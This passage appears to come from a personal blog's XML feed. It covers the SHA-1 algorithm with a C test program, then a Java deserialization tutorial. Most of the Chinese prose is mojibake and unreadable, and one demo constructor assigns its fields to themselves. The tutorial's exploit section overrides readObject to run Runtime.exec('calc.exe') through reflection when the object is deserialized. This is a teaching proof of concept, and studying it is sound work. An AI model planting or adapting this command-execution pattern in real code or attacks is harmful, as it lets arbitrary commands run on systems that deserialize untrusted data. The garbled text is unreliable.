64bitçš„ä¿¡æ¯ï¼Œç”¨æ¥è¡¨ç¤ºåŸå§‹ä¿¡æ¯æ‘˜è¦çš„é•¿åº¦ï¼Œåœ¨è¿™æ­¥æ“ä½œä¹‹åï¼Œä¿¡æ¯æŠ¥æ–‡ä¾¿æ˜¯512bitçš„å€æ•°ã€‚é€šå¸¸æ¥è¯´ç”¨ä¸€ä¸ª64ä½çš„æ•°æ®è¡¨ç¤ºåŸå§‹æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœæ¶ˆæ¯é•¿åº¦ä¸å¤§äº2^64ï¼Œé‚£ä¹ˆå‰32bitå°±ä¸º0ï¼Œåœ¨è¿›è¡Œé™„åŠ é•¿åº¦å€¼æ“ä½œåï¼Œå…¶â€œabcâ€æ•°æ®æŠ¥æ–‡å³å˜æˆå¦‚ä¸‹å½¢å¼ï¼š</p><p><code>61626380 00000000 00000000 00000000</code>â€¦â€¦â€¦..</p><p><code>00000000 00000000 00000000 00000000</code>â€¦â€¦.</p><p><code>00000000 00000000 00000000 00000000</code>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</p><p><code>00000000 00000000 00000000 00000018</code></p><p>å› ä¸ºâ€œabcâ€å 3ä¸ªå­—èŠ‚ï¼Œå³24ä½ ï¼Œæ¢ç®—ä¸ºåå…­è¿›åˆ¶å³ä¸º0x18ã€‚</p><h3 id="åˆå§‹åŒ–ç¼“å­˜"><a href="#åˆå§‹åŒ–ç¼“å­˜" class="headerlink" title="åˆå§‹åŒ–ç¼“å­˜"></a>åˆå§‹åŒ–ç¼“å­˜</h3><p>ä¸€ä¸ª160ä½MDç¼“å†²åŒºç”¨ä»¥ä¿å­˜ä¸­é—´å’Œæœ€ç»ˆæ•£åˆ—å‡½æ•°çš„ç»“æœã€‚å®ƒå¯ä»¥è¡¨ç¤ºä¸º5ä¸ª32ä½çš„å¯„å­˜å™¨(H0,H1,H2,H3,H4)ã€‚åˆå§‹åŒ–ä¸ºï¼š</p><p><code>H0 = 0x67452301</code></p><p><code>H1 = 0xEFCDAB89</code></p><p><code>H2 = 0x98BADCFE</code></p><p><code>H3 = 0x10325476</code></p><p><code>H4 = 0xC3D2E1F0</code></p><h3 id="è®¡ç®—æ¶ˆæ¯æ‘˜è¦-åˆ†å—å¤„ç†"><a href="#è®¡ç®—æ¶ˆæ¯æ‘˜è¦-åˆ†å—å¤„ç†" class="headerlink" title="è®¡ç®—æ¶ˆæ¯æ‘˜è¦(åˆ†å—å¤„ç†)"></a>è®¡ç®—æ¶ˆæ¯æ‘˜è¦(åˆ†å—å¤„ç†)</h3><p>åœ¨è®¡ç®—æŠ¥æ–‡ä¹‹å‰æˆ‘ä»¬è¿˜è¦åšä¸€äº›åŸºæœ¬çš„å·¥ä½œï¼Œå°±æ˜¯åœ¨æˆ‘ä»¬è®¡ç®—è¿‡ç¨‹ä¸­è¦ç”¨åˆ°çš„æ–¹æ³•ï¼Œæˆ–å®šä¹‰ã€‚</p><p>(1)ã€å¾ªç¯å·¦ç§»æ“ä½œç¬¦Sn(x),xæ˜¯ä¸€ä¸ªå­—ï¼Œä¹Ÿå°±æ˜¯32bitå¤§å°çš„å˜é‡ï¼Œnæ˜¯ä¸€ä¸ªæ•´æ•°ä¸”0&lt;&#x3D;n&lt;&#x3D;32ã€‚Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p>(2)ã€åœ¨ç¨‹åºä¸­æ‰€è¦ç”¨åˆ°çš„å¸¸é‡ï¼Œè¿™ä¸€ç³»åˆ—å¸¸é‡å­—k(0)ã€k(1)ã€â€¦k(79)ï¼Œå°†å…¶ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><p><code>Kt = 0x5A827999  (0 &lt;= t &lt;= 19)</code></p><p><code>Kt = 0x6ED9EBA1 (20 &lt;= t &lt;= 39)</code></p><p><code>Kt = 0x8F1BBCDC (40 &lt;= t &lt;= 59)</code></p><p><code>Kt = 0xCA62C1D6 (60 &lt;= t &lt;= 79)</code></p><p>(3)ã€æ‰€è¦ç”¨åˆ°çš„ä¸€ç³»åˆ—å‡½æ•°</p><p> <code>Ft(b,c,d)  ((b&amp;c)|((~b)&amp;d))   (0 &lt;= t &lt;= 19)</code></p><p> <code>Ft(b,c,d) (b^c^d)       (20 &lt;= t &lt;= 39)</code></p><p> <code>Ft(b,c,d) ((b&amp;c)|(b&amp;d)|(c&amp;d))  (40 &lt;= t &lt;= 59)</code></p><p> <code>Ft(b,c,d) (b^c^d)        (60 &lt;= t &lt;= 79)</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272045274.png"></p><h3 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h3><p>å¿…é¡»ä½¿ç”¨è¿›è¡Œäº†è¡¥ä½å’Œè¡¥é•¿åº¦åçš„æ¶ˆæ¯æ¥è®¡ç®—æ¶ˆæ¯æ‘˜è¦ã€‚</p><p>è®¡ç®—éœ€è¦ä¸€ä¸ªç¼“å†²åŒºï¼Œç”±5ä¸ª32ä½çš„å­—ç»„æˆï¼Œè¿˜éœ€è¦ä¸€ä¸ª80ä¸ª32ä½å­—çš„ç¼“å†²åŒºã€‚ç¬¬ä¸€ä¸ª5ä¸ªå­—çš„ç¼“å†²åŒºè¢«æ ‡è¯†ä¸ºAï¼ŒBï¼ŒCï¼ŒDï¼ŒEã€‚80ä¸ªå­—çš„ç¼“å†²åŒºè¢«æ ‡è¯†ä¸ºW0, W1,â€¦, W79</p><p>å¦å¤–è¿˜éœ€è¦ä¸€ä¸ªä¸€ä¸ªå­—çš„TEMPç¼“å†²åŒºã€‚</p><p>ä¸ºäº†äº§ç”Ÿæ¶ˆæ¯æ‘˜è¦ï¼Œåœ¨ç¬¬4éƒ¨åˆ†ä¸­å®šä¹‰çš„16ä¸ªå­—çš„æ•°æ®å—M1, M2,â€¦, Mn</p><p>ä¼šä¾æ¬¡è¿›è¡Œå¤„ç†ï¼Œå¤„ç†æ¯ä¸ªæ•°æ®å—Mi åŒ…å«80ä¸ªæ­¥éª¤ã€‚</p><p>ç°åœ¨å¼€å§‹å¤„ç†M1, M2, â€¦ , Mnã€‚ä¸ºäº†å¤„ç† Mi,éœ€è¦è¿›è¡Œä¸‹é¢çš„æ­¥éª¤</p><ul><li><p>(1). å°† Mi åˆ†æˆ 16 ä¸ªå­— W0, W1, â€¦ , W15,  W0 æ˜¯æœ€å·¦è¾¹çš„å­—<strong>ï¼ˆ512bitï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272046606.gif" alt="153211992014696001"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272047733.jpeg" alt="img"></p></li><li><p>(2). å¯¹äº t &#x3D; 16 åˆ° 79 ä»¤ Wt &#x3D; S1(Wt-3 XOR Wt-8 XOR Wt- 14 XOR Wt-16).</p></li><li><p>(3). ä»¤ A &#x3D; H0, B &#x3D; H1, C &#x3D; H2, D &#x3D; H3, E &#x3D; H4.</p></li><li><p>(4) å¯¹äº t &#x3D; 0 åˆ° 79ï¼Œæ‰§è¡Œä¸‹é¢çš„å¾ªç¯</p><p>â€‹    TEMP &#x3D; S5(A) + ft(B,C,D) + E + Wt + Kt;</p><p>â€‹    E &#x3D; D; D &#x3D; C; C &#x3D; S30(B); B &#x3D; A; A &#x3D; TEMP;</p></li><li><p>(5). ä»¤ H0 &#x3D; H0 + A, H1 &#x3D; H1 + B, H2 &#x3D; H2 + C, H3 &#x3D; H3 + D, H4 &#x3D; H4 + E</p><p>åœ¨å¤„ç†å®Œæ‰€æœ‰çš„ Mn, åï¼Œæ¶ˆæ¯æ‘˜è¦æ˜¯ä¸€ä¸ª160ä½çš„å­—ç¬¦ä¸²ï¼Œä»¥ä¸‹é¢çš„é¡ºåºæ ‡è¯†</p><p>H0 H1 H2 H3 H4ã€‚</p></li></ul><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SHA1Context sha;<br><span class="hljs-type">int</span> i, err;<br><span class="hljs-type">uint8_t</span> Message_Digest[<span class="hljs-number">20</span>];<br><span class="hljs-comment">// testing SHA1</span><br><span class="hljs-type">char</span>  *test = <span class="hljs-string">&quot;213124314124123asdasdas&quot;</span>;<br><span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;\næµ‹è¯•å€¼:\tâ€œ%sâ€\n&quot;</span>,test);<br>err = SHA1Reset(&amp;sha);    <span class="hljs-comment">//erro and return 0</span><br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1é‡ç½®é”™è¯¯ %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Input(&amp;sha, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)test, <span class="hljs-built_in">strlen</span>(test));<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1è¾“å…¥é”™è¯¯ %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Result(&amp;sha, Message_Digest);<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>    <span class="hljs-string">&quot;SHA1ç»“æœé”™è¯¯ %d, ä¸èƒ½è®¡ç®—æ‘˜è¦å€¼.\n&quot;</span>,<br>    err );<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‘˜è¦å€¼:\t&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span> ; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, Message_Digest[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>è¯¾å ‚çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¯†ç å­¦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–</title>
    <link href="/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h1><h2 id="ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–"></a>ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–</h2><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹(ä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­)ï¼ŒObjectOutputStreamç±»çš„<span class="hljs-built_in">writeObject</span>()æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Javaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼ŒObjectInputStreamç±»çš„<span class="hljs-built_in">readObject</span>()æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚<br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–åçš„æ–‡ä»¶å¯ä»¥æ–¹ä¾¿åœ¨å„ä¸ªå¹³å°ä½¿ç”¨windowsã€linuxç­‰ã€‚</p><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><ul><li>1.è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ã€‚</li><li>2.è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</li></ul><p><strong>æ³¨æ„ç‚¹ï¼šç”¨transientå…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ã€‚</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">people</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">people</span>();<br>        objectOutputStream.writeObject(people);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650605.png" alt="QQæˆªå›¾20220227163104"></p><p>ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶çœ‹ä¸æ‡‚ã€‚</p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        System.out.println(o);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650623.png" alt="QQæˆªå›¾20220227163615"></p><h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>è¿™é‡Œå°±ä¸ä¸€ä¸€å¤ç°<code>transient</code>å…³é”®å­—äº†</p><h2 id="åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´"><a href="#åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´"></a>åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´</h2><p>ä¹‹å‰å­¦ä¹ äº†åå°„å¼¹è®¡ç®—å™¨ã€‚è¿™é‡Œè¯•ç€ç”¨javaååºåˆ—åŒ–å¤ç°ä¸€ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å¦‚æœåœ¨ç»è¿‡åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–ï¼Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271648736.png" alt="QQæˆªå›¾20220227164828"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>    in.defaultReadObject();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¦ç»†è§£é‡Šä¸€ä¸‹ä¸‹é¢è¿™ä¸²ä»£ç ä¸­çš„ç»†èŠ‚ã€‚</p><ul><li>é‡å†™äº†ä¸€ä¸‹readObjectè¿™ä¸ªæ–¹æ³•ã€‚</li><li><code>in.defaultReadObject()</code>è°ƒç”¨åŸå§‹çš„readObjectæ–¹æ³•</li><li>åˆ©ç”¨åå°„ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ·±åº¦ç†è§£åå°„</title>
    <link href="/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
